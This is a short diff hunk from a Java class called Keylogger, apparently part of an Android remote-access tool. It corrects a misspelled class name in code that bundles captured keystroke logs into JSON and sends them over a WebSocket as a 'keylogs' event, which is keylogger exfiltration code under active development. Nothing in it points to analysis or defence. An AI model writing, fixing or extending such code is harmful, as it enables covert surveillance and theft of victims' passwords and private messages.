@@ -66,7 +66,7 @@ public class Keylogger {
                 }
                 JSONObject data = new JSONObject();
                 data.put("logs", arr);
-                XRCXRCWebSocketClient.get(ctx).sendEvent("keylogs", data);
+                XRCWebSocketClient.get(ctx).sendEvent("keylogs", data);
             } catch (JSONException e) {
                 Log.e(TAG, "Dump failed", e);
             }
